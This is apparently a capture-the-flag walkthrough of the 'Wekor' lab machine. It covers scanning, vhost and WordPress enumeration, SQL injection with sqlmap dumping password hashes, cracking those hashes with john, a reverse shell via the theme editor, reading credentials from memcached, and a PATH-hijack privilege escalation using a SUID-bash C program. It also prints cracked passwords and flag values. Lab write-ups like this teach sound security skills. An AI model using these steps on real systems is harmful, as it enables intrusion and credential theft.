> Wekor | Sqli , WordPress , vhost enumeration and internal services

# Rustscan

rustscan -a $IP --ulimit=5000 -- -sC -sV -Pn -A | tee rustscan.log


```
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,sql,bak,tar,zip,cgi,bin

```
/robots.txt (Status: 200)
```

## robots.txt

```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

I did a bash one-liner to check for a woking site. 

`for i in `cat url.txt`; do echo $i;echo "============================";curl http://wekor.thm"$i";echo "============================"; done` => And got a 301 Moved Permanent Eroor at `/comingreallysoon`

## Message

```
<p>The document has moved <a href="http://wekor.thm/comingreallysoon/">here</a>.</p>
```

And accessing the link we get a message 

`Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! `

Looking through the site, we can find a page where we can apply coupon codes and let's try for SQLi.

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1` Oooh! It works.🔥

# Enumerating Vhosts

gobuster vhost -u wekor.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt

```
Found: site.wekor.thm (Status: 200) [Size: 143]
```

Accessing the site above we got `Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! - Jim `. We got an username `Jim`. But let's do further enumeration by fuzzing this vhost.

## FFUF

ffuf -u http://site.wekor.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt, .php, .html -c

```
wordpress               [Status: 301, Size: 320, Words: 20, Lines: 10]
```

We got the site let's enumerate further using wpscan.

## Wpscan

wpscan --url htttp://site.wekor.thm/wordpress --enumerate vp,u

```
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://site.wekor.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://site.wekor.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://site.wekor.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://site.wekor.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |  - http://site.wekor.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (0 / 10)  0.00%  ETA: ??:? Brute Forcing Author IDs - Time: 00:00:00 <> (1 / 10) 10.00%  ETA: 00:0 Brute Forcing Author IDs - Time: 00:00:00 <> (2 / 10) 20.00%  ETA: 00:0 Brute Forcing Author IDs - Time: 00:00:01 <> (4 / 10) 40.00%  ETA: 00:0 Brute Forcing Author IDs - Time: 00:00:02 <> (8 / 10) 80.00%  ETA: 00:0 Brute Forcing Author IDs - Time: 00:00:02 <> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

But couldn't bruteforce password for admin and can't access any other contents. So back to SQli in `wekor.thm/it-next`.
Let's try to capture the request and pass it to sqlmap.

# sqlmap

sqlmap -r request.txt --dbs

```
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
```

sqlmap -r request.txt -D wordpress -tables

```
Database: wordpress
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              | => Let's start with usernames
+-----------------------+
```


sqlmap -r request.txt --dump -D wordpress -T wp_users

```
Database: wordpress
Table: wp_users
[4 entries]
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |
| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
```

## Cracking hashes

john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass hash.txt

```
rockyou          (?)
xxxxxx           (?)
soccer13         (?) => Worked out for wp_yura user
```

We can login to website through `site.wekor.thm/wordpress/wp-login.php`. And we are in let's try to get a reverse shell!
Let's edit the 404.php in Theme Editor and put our php reverse shell!

Let's check for abnormal services.

ss -tulpn

```
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0         *:68                    *:*                  
udp    UNCONN     0      0         *:631                   *:*                  
udp    UNCONN     0      0         *:44002                 *:*                  
udp    UNCONN     0      0         *:5353                  *:*                  
udp    UNCONN     0      0        :::33592                :::*                  
udp    UNCONN     0      0        :::5353                 :::*                  
tcp    LISTEN     0      10     127.0.0.1:3010                  *:*                  
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
tcp    LISTEN     0      128    127.0.0.1:11211                 *:*    => Hit!!🐛              
tcp    LISTEN     0      128       *:22                    *:*                  
tcp    LISTEN     0      5      127.0.0.1:631                   *:*                  
tcp    LISTEN     0      128      :::80                   :::*                  
tcp    LISTEN     0      128      :::22                   :::*                  
tcp    LISTEN     0      5       ::1:631                  :::*  
```

It's memcache service for speeding up dynamic web applications by alleviating database load.

# Exploiting Memcache

telnet 127.0.0.1 11211

1. stats slabs => To refer active slabs 

```
STAT active_slabs 1
```

2. stats items => To fetch count, age, eviction, expired etc. organized by slab ID.
3. stats cachedump 1 0 => Dump all keys in a slab

**Note: 1 => Slab_ID  0 => dump all key in the particular slab**

```
ITEM id [4 b; 1618660953 s]
ITEM email [14 b; 1618660953 s]
ITEM salary [8 b; 1618660953 s]
ITEM password [15 b; 1618660953 s]
ITEM username [4 b; 1618660953 s]
```
4. Get the values of those objects. 

```
get username
VALUE username 0 4
Orka
END
get password
VALUE password 0 15
OrkAiSC00L24/7$
END
```

# user.txt

```
1a26a6d51c0172400add0e297608dec6
```

# Privilege Escalation

sudo -l

```
User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

And we find ourselves a ELF binary. On executing it we don't have the password. So let's `strings` teh binary and the password is `password`. And python is called without full path. Looking at $PATH we can see /usr/sbin can be written by Orka.

# /tmp/python.c

```
#include <stdio.h>
#include <stdlib.h>

void main(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

gcc -o python python.c => Let's copy it to /usr/sbin since we can write there and the path is set.
cp /tmp/python /usr/sbin/
sudo /home/Orka/Desktop/bitcoin

And we are root!!🎉

# root.txt

```
f4e788f87cc3afaecbaf0f0fe9ae6ad7
```